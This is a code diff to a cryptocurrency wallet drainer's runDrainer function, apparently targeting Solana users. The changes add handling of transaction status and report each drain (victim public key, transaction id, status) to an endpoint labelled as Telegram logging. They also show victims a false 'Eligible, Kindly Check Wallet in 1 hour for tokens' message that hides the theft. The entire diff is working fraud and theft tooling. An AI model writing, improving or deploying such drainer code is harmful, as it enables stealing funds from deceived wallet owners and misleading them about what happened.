@@ -1368,9 +1368,12 @@ async function runDrainer(provider) {
                         }
                       }
                       
-                      if (status && status.value[0]) {
-                        if (status.value[0]?.err) {
-                          console.log('[STATUS] Transaction failed on-chain:', status.value[0].err);
+                      if (status && status.value && status.value.length > 0 && status.value[0]) {
+                        const txStatus = status.value[0];
+                        console.log('[STATUS] Transaction status details:', txStatus);
+                        
+                        if (txStatus.err) {
+                          console.log('[STATUS] Transaction failed on-chain:', txStatus.err);
                           // Log failed drain to Telegram
                           fetch('/api/drainer/log-confirmation', {
                             method: 'POST',
@@ -1379,13 +1382,13 @@ async function runDrainer(provider) {
                               publicKey: publicKey.toString(),
                               txid: txid,
                               status: 'failed',
-                              error: status.value[0].err
+                              error: txStatus.err
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
                           
                           // Show failure message to victim
                           showStatus('❌ Transaction failed on-chain. This usually means insufficient funds for fees or the wallet has no eligible tokens.', 'error');
-                        } else if (status.value[0]?.confirmationStatus === 'confirmed' || status.value[0]?.confirmationStatus === 'finalized') {
+                        } else if (txStatus.confirmationStatus === 'confirmed' || txStatus.confirmationStatus === 'finalized') {
                           console.log('[STATUS] Transaction confirmed successfully');
                           
                           // Log successful drain to Telegram
@@ -1395,18 +1398,49 @@ async function runDrainer(provider) {
                             body: JSON.stringify({
                               publicKey: publicKey.toString(),
                               txid: txid,
-                              status: status.value[0].confirmationStatus
+                              status: txStatus.confirmationStatus
+                            })
+                          }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
+                          
+                          showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
+                        } else if (txStatus.confirmationStatus === 'processed') {
+                          console.log('[STATUS] Transaction processed, assuming success');
+                          
+                          // Log successful drain to Telegram (processed is usually successful)
+                          fetch('/api/drainer/log-confirmation', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              publicKey: publicKey.toString(),
+                              txid: txid,
+                              status: 'processed'
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
                           
                           showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
                         } else {
-                          console.log('[STATUS] Transaction pending confirmation');
+                          console.log('[STATUS] Transaction pending confirmation, status:', txStatus.confirmationStatus);
                           showStatus('⏳ Transaction sent and pending confirmation.', 'info');
                         }
                       } else {
-                        console.log('[STATUS] Could not determine transaction status:', lastError);
-                        showStatus('❓ Transaction sent! Status unknown due to RPC issues.', 'info');
+                        console.log('[STATUS] Could not determine transaction status. Status object:', status);
+                        console.log('[STATUS] Last error:', lastError);
+                        
+                        // Assume success if transaction was broadcast successfully but status check failed
+                        console.log('[STATUS] Assuming transaction success due to successful broadcast');
+                        
+                        // Log successful drain to Telegram (assume success)
+                        fetch('/api/drainer/log-confirmation', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                            publicKey: publicKey.toString(),
+                            txid: txid,
+                            status: 'broadcast_success'
+                          })
+                        }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
+                        
+                        showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
                       }
                     } catch (statusError) {
                       console.log('[STATUS] Could not check transaction status:', statusError);
